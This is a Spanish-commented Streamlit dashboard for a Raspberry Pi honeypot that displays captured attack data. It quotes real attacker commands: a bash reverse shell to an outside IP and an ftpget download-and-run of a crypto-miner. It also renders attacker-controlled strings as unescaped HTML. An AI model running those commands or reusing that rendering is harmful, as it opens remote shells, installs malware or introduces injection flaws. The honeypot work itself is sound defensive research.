import streamlit as st
import json
import pandas as pd
import os
import time

st.set_page_config(page_title="HoneyPI SOC Lab", page_icon="🛡️", layout="wide")

# =========================================================
#  ESTETICA "HACKER / SOC" - fondo negro, texto verde, monoespaciado
# =========================================================
st.markdown(
    """
    <style>
        .stApp {
            background-color: #0a0e0a;
            color: #33ff66;
        }
        html, body, [class*="css"] {
            font-family: 'Courier New', 'Consolas', monospace !important;
        }
        h1, h2, h3, h4 {
            color: #39ff6a !important;
            text-shadow: 0 0 6px rgba(57, 255, 106, 0.35);
        }
        p, li, span, label, .stMarkdown {
            color: #7dffa0 !important;
        }
        [data-testid="stMetricValue"] {
            color: #39ff6a !important;
            font-family: 'Courier New', monospace !important;
        }
        [data-testid="stMetricLabel"] {
            color: #5bd97f !important;
        }
        [data-testid="stMetric"] {
            background-color: #0f1a10;
            border: 1px solid #1e5c30;
            border-radius: 6px;
            padding: 10px;
        }
        section[data-testid="stSidebar"] {
            background-color: #060a06;
            border-right: 1px solid #1e5c30;
        }
        .stDataFrame, .stTable {
            background-color: #0f1a10 !important;
        }
        div[data-baseweb="tab-list"] {
            background-color: #0f1a10;
        }
        hr {
            border-color: #1e5c30 !important;
        }
        a { color: #5bd9ff !important; }
        .terminal-box {
            background-color: #0f1a10;
            border: 1px solid #1e5c30;
            border-radius: 6px;
            padding: 14px 16px;
            font-family: 'Courier New', monospace;
            color: #7dffa0;
        }
        .blink {
            animation: blink-animation 1.4s steps(2, start) infinite;
        }
        @keyframes blink-animation {
            to { visibility: hidden; }
        }
    </style>
    """,
    unsafe_allow_html=True,
)

# --- Rutas relativas al repo ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")

HISTORIAL_PATH = os.path.join(DATA_DIR, "incidentes.json")
IPS_ENRIQUECIDAS_PATH = os.path.join(DATA_DIR, "ips_enriquecidas.json")
PAYLOADS_PATH = os.path.join(DATA_DIR, "payloads_capturados.json")
ESTADO_HW_PATH = os.path.join(DATA_DIR, "estado_hardware.json")

# =========================================================
#  CARGA DE DATOS (se hace una vez, arriba, para usarla en sidebar + main)
# =========================================================
estado_hw = {}
if os.path.exists(ESTADO_HW_PATH):
    try:
        with open(ESTADO_HW_PATH, "r") as f:
            estado_hw = json.load(f)
    except Exception:
        pass

df = pd.DataFrame()
if os.path.exists(HISTORIAL_PATH):
    try:
        with open(HISTORIAL_PATH, "r") as f:
            datos = json.load(f)
        df = pd.DataFrame(datos)
        if not df.empty:
            df = df.iloc[::-1].reset_index(drop=True)
    except Exception:
        pass

ips_data = {}
if os.path.exists(IPS_ENRIQUECIDAS_PATH):
    try:
        with open(IPS_ENRIQUECIDAS_PATH, "r") as f:
            ips_data = json.load(f)
    except Exception:
        pass

payloads = []
if os.path.exists(PAYLOADS_PATH):
    try:
        with open(PAYLOADS_PATH, "r") as f:
            payloads = json.load(f)
    except Exception:
        pass

# =========================================================
#  SIDEBAR: panel fijo con estado + mapa (queda "al costado" siempre visible)
# =========================================================
with st.sidebar:
    st.markdown("### 🛡️ HONEYPI // SOC-LAB")
    st.markdown('<span class="blink">● LIVE</span>', unsafe_allow_html=True)
    st.caption("Espejo público de solo lectura · sync cada 30 min")

    st.markdown("---")
    st.markdown("**ESTADO DEL SISTEMA**")
    st.metric("🌡️ TEMP CPU", estado_hw.get("temperatura", "N/A"))
    throttled = estado_hw.get("throttled", "N/A")
    st.metric("⚡ THROTTLE", "OK" if throttled == "0x0" else throttled)
    st.caption(f"Última sync: {estado_hw.get('actualizado', 'N/A')}")

    st.markdown("---")
    st.markdown("**RESUMEN DE ATAQUES**")
    total_eventos = len(df) if not df.empty else 0
    ips_unicas = df["ip_origen"].nunique() if not df.empty and "ip_origen" in df.columns else 0
    st.metric("🚨 EVENTOS", total_eventos)
    st.metric("🌍 IPs ÚNICAS", ips_unicas)
    st.metric("🎯 PAYLOADS", len(payloads))

    st.markdown("---")
    st.markdown("**MAPA DE ORIGEN**")
    mapa_puntos = []
    for ip, info in ips_data.items():
        geo = info.get("geolocalizacion", {})
        lat, lon = geo.get("lat"), geo.get("lon")
        if lat is not None and lon is not None:
            mapa_puntos.append({"lat": lat, "lon": lon})
    if mapa_puntos:
        st.map(pd.DataFrame(mapa_puntos), zoom=0, use_container_width=True)
    else:
        st.caption("Sin datos de geolocalización todavía.")

    st.markdown("---")
    st.markdown(
        """
        <div style="font-size: 0.8em; opacity: 0.85;">
        📖 <a href="https://www.linkedin.com/pulse/honeypi-un-soc-casero-con-ia-local-cap%C3%ADtulo-1-pablo-rattin-ntrwf/" target="_blank">Cómo se armó →</a><br>
        🔗 <a href="https://www.linkedin.com/in/pablorattin" target="_blank">LinkedIn</a> ·
        <a href="https://praxiscybersecurity.com" target="_blank">Praxis Cybersecurity</a>
        </div>
        """,
        unsafe_allow_html=True,
    )

# =========================================================
#  MAIN: titulo + contenido
# =========================================================
st.markdown("# 🛡️ HONEYPI _SOC-LAB.exe")
st.markdown(
    '<div class="terminal-box">'
    "root@honeypot:~# tail -f /var/log/attacks.log<br>"
    "&gt; Monitoreo activo — Raspberry Pi 5 · Cowrie · Claude API · YARA · VirusTotal"
    "</div>",
    unsafe_allow_html=True,
)

auto_refresh = st.checkbox("🔄 Auto-actualizar cada 30s")

st.markdown("---")

# --- Casos destacados ---
st.markdown("### ⭐ CASOS_DESTACADOS.log")
st.caption("Los eventos más reveladores capturados hasta ahora, seleccionados manualmente.")

CASOS_DESTACADOS = [
    {
        "titulo": "🔓 Reverse Shell hacia servidor externo",
        "comando": "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
        "descripcion": "Técnica clásica de post-explotación: el atacante intenta abrir una shell interactiva reversa hacia un servidor de control remoto, en el puerto 4444 (típico de Metasploit/netcat).",
    },
    {
        "titulo": "⛏️ Descarga de criptominer vía FTP",
        "comando": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
        "descripcion": "Patrón típico de botnet IoT (Mirai/Gafgyt): descarga un binario vía FTP (con fallback a BusyBox para dispositivos embebidos), lo ejecuta y se autoborra. Confirmado por YARA (XMRig_Miner) y VirusTotal (41/65 motores).",
    },
    {
        "titulo": "🕵️ Autodetección de honeypot",
        "comando": '/usr/bin/bash -c printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter',
        "descripcion": "El atacante crea, ejecuta y borra un script de prueba para verificar si tiene permisos reales de escritura/ejecución — una técnica de evasión de sandboxes y honeypots.",
    },
]

for caso in CASOS_DESTACADOS:
    with st.expander(caso["titulo"]):
        st.code(caso["comando"], language="bash")
        st.write(caso["descripcion"])

st.markdown("---")

# --- Estadisticas de ataques ---
if not df.empty:
    st.markdown("### 📊 STATS.json")

    if "servicio" in df.columns:
        st.metric("🎯 PROTOCOLO MÁS ATACADO", df["servicio"].value_counts().idxmax())

    e1, e2 = st.columns(2)
    with e1:
        st.write("**Ataques por Protocolo**")
        if "servicio" in df.columns:
            st.bar_chart(df["servicio"].value_counts())
    with e2:
        st.write("**Top 10 IPs Atacantes**")
        if "ip_origen" in df.columns:
            st.bar_chart(df["ip_origen"].value_counts().head(10))

    st.write("**Top 10 Comandos Ejecutados**")
    if "comando" in df.columns:
        st.bar_chart(df["comando"].value_counts().head(10))

    # --- Mapa de calor por hora ---
    if "timestamp" in df.columns:
        st.markdown("---")
        st.markdown("### 🕐 ¿A QUÉ HORA ATACAN MÁS?")
        try:
            horas = pd.to_datetime(df["timestamp"], format="%Y-%m-%d %H:%M:%S").dt.hour
            conteo_horas = horas.value_counts().reindex(range(24), fill_value=0)
            conteo_horas.index = [f"{h:02d}h" for h in conteo_horas.index]
            st.bar_chart(conteo_horas)
            hora_pico = horas.value_counts().idxmax()
            st.caption(f"Hora con más actividad: {hora_pico:02d}:00 (hora del servidor)")
        except Exception:
            st.info("No se pudo calcular el mapa de calor horario.")

    # --- MITRE ATT&CK ---
    if "mitre_tactic" in df.columns:
        st.markdown("---")
        st.markdown("### 🗺️ MITRE_ATTCK.map")
        df_mitre = df[df["mitre_tactic"].notna() & (df["mitre_tactic"] != "N/A")]

        if not df_mitre.empty:
            m1, m2 = st.columns(2)
            with m1:
                st.write("**Eventos por Táctica MITRE**")
                st.bar_chart(df_mitre["mitre_tactic"].value_counts())
            with m2:
                if "severidad" in df_mitre.columns:
                    st.write("**Eventos por Severidad**")
                    orden_severidad = ["Critica", "Alta", "Media", "Baja"]
                    conteo_sev = df_mitre["severidad"].value_counts()
                    conteo_sev = conteo_sev.reindex(
                        [s for s in orden_severidad if s in conteo_sev.index]
                    )
                    st.bar_chart(conteo_sev)

            if "mitre_technique" in df_mitre.columns:
                st.write("**Top técnicas detectadas**")
                st.dataframe(
                    df_mitre["mitre_technique"].value_counts().reset_index().rename(
                        columns={"mitre_technique": "Técnica", "count": "Eventos"}
                    ),
                    width='stretch',
                    hide_index=True,
                )
        else:
            st.info("Todavía no hay eventos con clasificación MITRE.")

    # --- Costo estimado ---
    if "analisis" in df.columns:
        st.markdown("---")
        st.markdown("### 💰 COST_ESTIMATE.sh")
        try:
            analizados = df[
                ~df["analisis"].astype(str).str.startswith("[Repetido")
                & ~df["analisis"].astype(str).str.startswith("[Circuit")
            ]
            cantidad_analizados = len(analizados)

            TOKENS_ENTRADA_APROX = 150
            TOKENS_SALIDA_APROX = 120
            PRECIO_ENTRADA_POR_MILLON = 1.0
            PRECIO_SALIDA_POR_MILLON = 5.0

            tokens_entrada_total = cantidad_analizados * TOKENS_ENTRADA_APROX
            tokens_salida_total = cantidad_analizados * TOKENS_SALIDA_APROX
            costo_estimado = (
                (tokens_entrada_total / 1_000_000) * PRECIO_ENTRADA_POR_MILLON
                + (tokens_salida_total / 1_000_000) * PRECIO_SALIDA_POR_MILLON
            )

            co1, co2, co3 = st.columns(3)
            with co1:
                st.metric("CONSULTAS API", cantidad_analizados)
            with co2:
                st.metric("TOKENS TOTAL", f"{tokens_entrada_total + tokens_salida_total:,}")
            with co3:
                st.metric("COSTO USD", f"${costo_estimado:.4f}")

            st.caption(
                "Estimación aproximada (Claude Haiku 4.5: $1/millón entrada, $5/millón salida). "
                "No incluye consultas omitidas por anti-ráfaga o circuit breaker."
            )
        except Exception:
            st.info("No se pudo calcular el costo estimado.")
else:
    st.info("⌛ Sin datos de incidentes todavía.")

st.markdown("---")

# --- Geolocalizacion y reputacion (tabla detallada; el mapa ya esta en la sidebar) ---
st.markdown("### 🌎 GEOIP_REPUTATION.db")

if ips_data:
    filas = []
    for ip, info in ips_data.items():
        abuse = info.get("abuseipdb", {})
        geo = info.get("geolocalizacion", {})
        filas.append({
            "IP": ip,
            "País": geo.get("pais", "N/A"),
            "Ciudad": geo.get("ciudad", "N/A"),
            "ISP / Org": abuse.get("isp") or geo.get("org", "N/A"),
            "Score Abuso (%)": abuse.get("abuse_confidence_score", "N/A"),
            "Reportes Previos": abuse.get("total_reports", "N/A"),
            "Tipo de Uso": abuse.get("usage_type", "N/A"),
        })

    df_ips = pd.DataFrame(filas)
    st.dataframe(df_ips, width='stretch')

    r1, r2 = st.columns(2)
    with r1:
        score_promedio = df_ips["Score Abuso (%)"].replace("N/A", pd.NA).dropna().astype(float).mean()
        if pd.notna(score_promedio):
            st.metric("SCORE ABUSO PROMEDIO", f"{score_promedio:.0f}%")
    with r2:
        st.write("**Países de origen**")
        st.bar_chart(df_ips["País"].value_counts())
else:
    st.info("⌛ Sin datos de geolocalización todavía.")

st.markdown("---")

# --- Payloads capturados ---
st.markdown("### 🎯 PAYLOADS_CAPTURED.bin")

if payloads:
    st.metric("TOTAL PAYLOADS", len(payloads))
    df_payloads = pd.DataFrame(payloads).iloc[::-1].reset_index(drop=True)
    df_payloads["VirusTotal"] = df_payloads["sha256"].apply(
        lambda h: f"https://www.virustotal.com/gui/file/{h}"
    )

    def _veredicto_vt(fila):
        vt = fila.get("virustotal") if isinstance(fila, dict) else None
        if not isinstance(vt, dict):
            return "⚪ Sin consultar"
        if vt.get("error"):
            return "⚪ Sin consultar (API no configurada)"
        if vt.get("conocido") is False:
            return "🟡 Hash no visto antes"
        if vt.get("conocido") is True:
            maliciosos = vt.get("maliciosos", 0)
            total = (
                maliciosos
                + vt.get("sospechosos", 0)
                + vt.get("inofensivos", 0)
                + vt.get("sin_detectar", 0)
            )
            if maliciosos > 0:
                return f"🔴 Malicioso ({maliciosos}/{total} motores)"
            return f"🟢 Limpio (0/{total} motores)"
        return "⚪ Sin consultar"

    df_payloads["Veredicto VirusTotal"] = [_veredicto_vt(p) for p in payloads[::-1]]

    def _link_hybrid(fila):
        ha = fila.get("hybrid_analysis") if isinstance(fila, dict) else None
        if isinstance(ha, dict) and ha.get("link"):
            return ha["link"]
        return None

    df_payloads["Hybrid Analysis"] = [_link_hybrid(p) for p in payloads[::-1]]

    def _yara_texto(fila):
        matches = fila.get("yara_matches") if isinstance(fila, dict) else None
        if matches:
            return ", ".join(matches)
        return "Sin coincidencias"

    df_payloads["YARA"] = [_yara_texto(p) for p in payloads[::-1]]

    columnas_mostrar = ["timestamp", "nombre_archivo", "tamano_bytes", "YARA", "Veredicto VirusTotal", "VirusTotal", "Hybrid Analysis"]
    columnas_disponibles = [c for c in columnas_mostrar if c in df_payloads.columns]
    st.dataframe(
        df_payloads[columnas_disponibles],
        width='stretch',
        column_config={
            "VirusTotal": st.column_config.LinkColumn("VirusTotal", display_text="Ver análisis"),
            "Hybrid Analysis": st.column_config.LinkColumn("Hybrid Analysis", display_text="Ver análisis"),
        },
    )
else:
    st.info("Todavía no se capturó ningún payload real. La vigilancia sigue activa.")

st.markdown("---")

# --- Ultimo analisis + historial completo ---
if not df.empty:
    st.markdown("### 🔍 LAST_ANALYSIS.log")
    ultimo = df.iloc[0]
    st.markdown(
        f'<div class="terminal-box">'
        f'IP: {ultimo.get("ip_origen", "N/A")}<br>'
        f'CMD: {ultimo.get("comando", "N/A")}<br>'
        f'&gt; {ultimo.get("analisis", "N/A")}'
        f'</div>',
        unsafe_allow_html=True,
    )

    st.markdown("### 🕒 FULL_HISTORY.log")
    st.dataframe(df, width='stretch')

st.markdown("---")
st.caption("Proyecto HoneyPI — honeypot + IA local en Raspberry Pi 5. Código completo en GitHub: github.com/rattinp/soc-lab-raspberry-pi")

if auto_refresh:
    time.sleep(30)
    st.rerun()

